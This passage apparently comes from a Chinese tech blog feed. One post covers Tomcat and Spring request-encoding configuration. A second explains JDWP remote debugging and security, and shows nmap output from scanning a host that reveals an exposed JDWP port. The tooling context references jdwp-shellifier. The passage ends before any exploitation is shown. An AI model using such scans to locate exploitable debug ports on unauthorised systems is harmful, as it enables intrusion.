<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Connector</span> <span class="attr">port</span>=<span class="string">"8080"</span> <span class="attr">maxThreads</span>=<span class="string">"150"</span> <span class="attr">minSpareThreads</span>=<span class="string">"25"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">maxSpareThreads</span>=<span class="string">"75"</span> <span class="attr">enableLookups</span>=<span class="string">"false"</span> <span class="attr">redirectPort</span>=<span class="string">"8443"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">acceptCount</span>=<span class="string">"100"</span> <span class="attr">debug</span>=<span class="string">"99"</span> <span class="attr">connectionTimeout</span>=<span class="string">"20000"</span> </span></span><br><span class="line"><span class="tag"><span class="attr">disableUploadTimeout</span>=<span class="string">"true"</span> <span class="attr">URIEncoding</span>=<span class="string">"UTF-8"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
<p>tomcat 对URI默认的编码是<code>ISO-8859-1</code>，在<code>Connector</code>中配置<strong>URIEncoding=”UTF-8”</strong> 就可以指定编码。</p>
<p>tomcat中关于编码的代码:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.connector.CoyoteAdapter#convertURI</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Character conversion of the URI.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">convertURI</span><span class="params">(MessageBytes uri, Request request)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        ByteChunk bc = uri.getByteChunk();</span><br><span class="line">        <span class="keyword">int</span> length = bc.getLength();</span><br><span class="line">        CharChunk cc = uri.getCharChunk();</span><br><span class="line">        cc.allocate(length, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        String enc = connector.getURIEncoding();</span><br><span class="line">        <span class="keyword">if</span> (enc != <span class="keyword">null</span>) &#123;</span><br><span class="line">            B2CConverter conv = request.getURIConverter();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (conv == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    conv = <span class="keyword">new</span> B2CConverter(enc, <span class="keyword">true</span>);</span><br><span class="line">                    request.setURIConverter(conv);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    conv.recycle();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                log.error(<span class="string">"Invalid URI encoding; using HTTP default"</span>);</span><br><span class="line">                connector.setURIEncoding(<span class="keyword">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (conv != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    conv.convert(bc, cc, <span class="keyword">true</span>);</span><br><span class="line">                    uri.setChars(cc.getBuffer(), cc.getStart(), cc.getLength());</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException ioe) &#123;</span><br><span class="line">                    <span class="comment">// Should never happen as B2CConverter should replace</span></span><br><span class="line">                    <span class="comment">// problematic characters</span></span><br><span class="line">                    request.getResponse().sendError(</span><br><span class="line">                            HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Default encoding: fast conversion for ISO-8859-1</span></span><br><span class="line">        <span class="keyword">byte</span>[] bbuf = bc.getBuffer();</span><br><span class="line">        <span class="keyword">char</span>[] cbuf = cc.getBuffer();</span><br><span class="line">        <span class="keyword">int</span> start = bc.getStart();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            cbuf[i] = (<span class="keyword">char</span>) (bbuf[i + start] &amp; <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        uri.setChars(cbuf, <span class="number">0</span>, length);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="Request的编码"><a href="#Request的编码" class="headerlink" title="Request的编码"></a>Request的编码</h2><p>设置了上述编码后，获取request的参数还是有可能乱码， 此时需要指定对应的filter。</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>tomcat中也实现了一个编码的filter：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.filters.SetCharacterEncodingFilter</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Select and set (if specified) the character encoding to be used to</span></span><br><span class="line"><span class="comment">     * interpret request parameters for this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request The servlet request we are processing</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response The servlet response we are creating</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain The filter chain we are processing</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> IOException if an input/output error occurs</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@exception</span> ServletException if a servlet error occurs</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response,</span></span></span><br><span class="line"><span class="function"><span class="params">                         FilterChain chain)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Conditionally select and set the character encoding to be used</span></span><br><span class="line">        <span class="keyword">if</span> (ignore || (request.getCharacterEncoding() == <span class="keyword">null</span>)) &#123;</span><br><span class="line">            String characterEncoding = selectEncoding(request);</span><br><span class="line">            <span class="keyword">if</span> (characterEncoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(characterEncoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Pass control on to the next filter</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在<code>web.xml</code>中的配置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>filters.SetCharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>GBK<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>SetCharacterEncoding<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h2><p>在spring mvc中可以做如下的配置：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>encodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>一定要配置成<strong>第一个</strong><code>filter</code>，否则还是不会生效。</p>
<p>它的实现也很简单：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.springframework.web.filter.CharacterEncodingFilter#doFilterInternal</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doFilterInternal</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">            HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line"></span><br><span class="line">        String encoding = getEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isForceRequestEncoding() || request.getCharacterEncoding() == <span class="keyword">null</span>) &#123;</span><br><span class="line">                request.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (isForceResponseEncoding()) &#123;</span><br><span class="line">                response.setCharacterEncoding(encoding);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>setCharacterEncoding</code>是Servlet规范中定义的方法， 看下<code>tomcat</code>的实现：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#mergeParameters</span></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Merge the parameters from the saved query parameter string (if any), and</span></span><br><span class="line"><span class="comment">     * the parameters already present on this request (if any), such that the</span></span><br><span class="line"><span class="comment">     * parameter values from the query string show up first if there are</span></span><br><span class="line"><span class="comment">     * duplicate parameter names.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">mergeParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((queryParamString == <span class="keyword">null</span>) || (queryParamString.length() &lt; <span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        HashMap&lt;String, String[]&gt; queryParameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        String encoding = getCharacterEncoding();</span><br><span class="line">        <span class="keyword">if</span> (encoding == <span class="keyword">null</span>)</span><br><span class="line">            encoding = <span class="string">"ISO-8859-1"</span>;</span><br><span class="line">        RequestUtil.parseParameters(queryParameters, queryParamString,</span><br><span class="line">                encoding);</span><br><span class="line">        Iterator&lt;String&gt; keys = parameters.keySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (keys.hasNext()) &#123;</span><br><span class="line">            String key = keys.next();</span><br><span class="line">            Object value = queryParameters.get(key);</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                queryParameters.put(key, parameters.get(key));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            queryParameters.put</span><br><span class="line">                (key, mergeValues(value, parameters.get(key)));</span><br><span class="line">        &#125;</span><br><span class="line">        parameters = queryParameters;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到默认的编码是<code>&quot;ISO-8859-1&quot;</code>, 为什么要设置成第一个filter呢，找到调用的地方看：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org.apache.catalina.core.ApplicationHttpRequest#parseParameters</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Parses the parameters of this request.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If parameters are present in both the query string and the request</span></span><br><span class="line"><span class="comment">     * content, they are merged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">parseParameters</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (parsedParams) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameters = <span class="keyword">new</span> HashMap&lt;String, String[]&gt;();</span><br><span class="line">        parameters = copyMap(getRequest().getParameterMap());</span><br><span class="line">        mergeParameters();</span><br><span class="line">        parsedParams = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>parseParameters</code>只会调用一次，如果在前面的<code>filter</code>中尝试获取<code>Parameters</code>中的参数，这个tomcat就会用默认的编码去解析传入的参数了。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://blog.csdn.net/u010001043/article/details/53203576" rel="external nofollow noopener noreferrer" target="_blank">UrlConnection post请求中文参数乱码问题 - CSDN博客</a></li>
<li><a href="https://blog.csdn.net/huangshaotian/article/details/7472662" rel="external nofollow noopener noreferrer" target="_blank">设置Java JDK的默认编码为UTF-8 - CSDN博客</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> encoding </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[jdwp远程调试与安全]]></title>
      <url>http://qsli.github.io/2018/08/12/jdwp/</url>
      <content type="html"><![CDATA[<h1 id="什么是JDWP？"><a href="#什么是JDWP？" class="headerlink" title="什么是JDWP？"></a>什么是JDWP？</h1><blockquote>
<p>JDWP（Java Debug Wire Protocol）是一个为 Java 调试而设计的一个通讯交互协议，它定义了调试器和被调试程序之间<strong>传递的信息的格式</strong>。在 JPDA 体系中，作为前端（front-end）的调试者（debugger）进程和后端（back-end）的被调试程序（debuggee）进程之间的交互数据的格式就是由 JDWP 来描述的，它详细完整地定义了请求命令、回应数据和错误代码，保证了前端和后端的 JVMTI 和 JDI 的通信通畅。比如在 Sun 公司提供的实现中，它提供了一个名为 jdwp.dll（jdwp.so）的动态链接库文件，这个动态库文件实现了一个 Agent，它会负责解析前端发出的请求或者命令，并将其转化为 JVMTI 调用，然后将 JVMTI 函数的返回值封装成 JDWP 数据发还给后端。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Components                          Debugger Interfaces</span><br><span class="line"></span><br><span class="line">                /    |--------------|</span><br><span class="line">               /     |     VM       |</span><br><span class="line"> debuggee ----(      |--------------|  &lt;------- JVM TI - Java VM Tool Interface</span><br><span class="line">               \     |   back-end   |</span><br><span class="line">                \    |--------------|</span><br><span class="line">                /           |</span><br><span class="line"> comm channel -(            |  &lt;--------------- JDWP - Java Debug Wire Protocol</span><br><span class="line">                \           |</span><br><span class="line">                     |--------------|</span><br><span class="line">                     | front-end    |</span><br><span class="line">                     |--------------|  &lt;------- JDI - Java Debug Interface</span><br><span class="line">                     |      UI      |</span><br><span class="line">                     |--------------|</span><br></pre></td></tr></table></figure>
<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jvmti" rel="external nofollow noopener noreferrer" target="_blank">JVM TI</a> -<strong>Java VM Tool Interface</strong></p>
<p>Defines the debugging services a VM provides.</p>
<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdwp" rel="external nofollow noopener noreferrer" target="_blank">JDWP</a> - <strong>Java Debug Wire Protocol</strong></p>
<p>Defines the communication between <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#debuggee" rel="external nofollow noopener noreferrer" target="_blank">debuggee</a> and debugger processes.</p>
<p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/jpda/architecture.html#jdi" rel="external nofollow noopener noreferrer" target="_blank">JDI</a> - <strong>Java Debug Interface</strong></p>
<p>Defines a high-level Java language interface which tool developers can easily use to write remote debugger applications.</p>
<h1 id="发现开启了JDWP的端口"><a href="#发现开启了JDWP的端口" class="headerlink" title="发现开启了JDWP的端口"></a>发现开启了JDWP的端口</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p><code>nmap</code>是端口扫描的利器，支持批量扫描网段内端口打开的情况。通过<code>nmap</code>的扫描可以找到端口和对应的协议，这样就可以扫描到打开了远程debug的端口的机器。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">➜  ~  sudo nmap -sV 221.221.221.221</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-10 12:12 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> izbp16k6k2yv9vvh6c3v65zi (221.221.221.221)</span><br><span class="line">Host is up (0.033s latency).</span><br><span class="line">Not shown: 972 closed ports</span><br><span class="line">PORT      STATE    SERVICE        VERSION</span><br><span class="line">22/tcp    open     ssh            OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">42/tcp    filtered nameserver</span><br><span class="line">80/tcp    open     http           nginx 1.10.2</span><br><span class="line">111/tcp   open     rpcbind        2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   filtered msrpc</span><br><span class="line">139/tcp   filtered netbios-ssn</span><br><span class="line">443/tcp   open     ssl/http       nginx 1.10.2</span><br><span class="line">445/tcp   filtered microsoft-ds</span><br><span class="line">593/tcp   filtered http-rpc-epmap</span><br><span class="line">901/tcp   filtered samba-swat</span><br><span class="line">1068/tcp  filtered instl_bootc</span><br><span class="line">3128/tcp  filtered squid-http</span><br><span class="line">3333/tcp  filtered dec-notes</span><br><span class="line">3690/tcp  open     svnserve       Subversion</span><br><span class="line">4444/tcp  filtered krb524</span><br><span class="line">5800/tcp  filtered vnc-http</span><br><span class="line">5900/tcp  filtered vnc</span><br><span class="line">6129/tcp  filtered unknown</span><br><span class="line">6667/tcp  filtered irc</span><br><span class="line">7070/tcp  open     http           nginx 1.10.3</span><br><span class="line">8081/tcp  open     http           Apache Tomcat 8.5.13</span><br><span class="line">8180/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">8181/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9001/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9011/tcp  open     http           Apache Tomcat/Coyote JSP engine 1.1</span><br><span class="line">9998/tcp  open     http           Jetty 9.4.7.v20170914</span><br><span class="line">9999/tcp  open     http           Jetty 9.2.24.v20180105</span><br><span class="line">10010/tcp open     jdwp           Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_121</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.42 seconds</span><br></pre></td></tr></table></figure>
<p>从扫描的结果中可以看到<code>10010</code>端口开启了远程调试。</p>
<h3 id="端口明明开了，却没有扫描到？"><a href="#端口明明开了，却没有扫描到？" class="headerlink" title="端口明明开了，却没有扫描到？"></a>端口明明开了，却没有扫描到？</h3><p>nmap默认只扫描每个协议常见的1000个端口，如果你的端口不在里面，默认就不会扫描。</p>
<blockquote>
<p><a href="https://nmap.org/book/man-port-specification.html" rel="external nofollow noopener noreferrer" target="_blank">Nmap scans the most common 1,000 ports for each protocol</a>. If your port is not in that list, it won’t be scanned. </p>
</blockquote>
<p>端口使用的频率存储在<code>nmap-services</code>文件中：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) locate nmap-services</span><br><span class="line">/usr/<span class="built_in">local</span>/Cellar/nmap/7.70/share/nmap/nmap-services</span><br></pre></td></tr></table></figure>
<p>可以直接查看这个文件， 也可以使用下面的命令查看对应的频率：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  jdwp-shellifier (master|✔) sudo nmap -v -oG - -sSU</span><br><span class="line">Password:</span><br><span class="line"># Nmap 7.70 scan initiated Fri Aug 10 13:46:47 2018 as: nmap -v -oG - -sSU</span><br><span class="line"># Ports scanned: TCP(1000;1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521...省略</span><br></pre></td></tr></table></figure>
<p>具体说明参见： <a href="https://secwiki.org/w/FAQ_missing_port" rel="external nofollow noopener noreferrer" target="_blank">FAQ missing port - SecWiki</a></p>
<p>解决方案：</p>
<p><code>nmap</code>中可以通过<code>-p</code>指定扫描的端口范围：</p>
